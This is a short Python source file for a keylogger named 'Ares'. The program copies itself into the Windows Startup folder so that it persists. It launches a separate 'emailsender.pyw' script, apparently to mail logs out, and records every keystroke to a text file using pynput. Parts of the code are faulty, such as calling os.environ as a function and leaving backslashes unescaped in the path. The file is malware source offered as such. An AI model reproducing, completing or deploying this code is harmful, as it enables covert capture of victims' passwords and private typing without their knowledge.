#Ares v2.1.0.1

from pynput.keyboard import Key, Listener
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import socket
import datetime
import sys
from subprocess import Popen
from threading import Thread
import shutil

username = os.environ()
shutil.copyfile('Ares.exe', "C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % (username))

class MyThread(Thread):
    def run(self):
        os.system('emailsender.pyw')
        pass

thread = MyThread()
thread.daemon = True
thread.start()

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')

def on_press(key):
    logging.info('"{0}"'.format(key))

#def on_press(key):
#    logging.info(str(key))
#    if key == Key.esc:
#        return False

with Listener(on_press=on_press) as listener:
    listener.join()
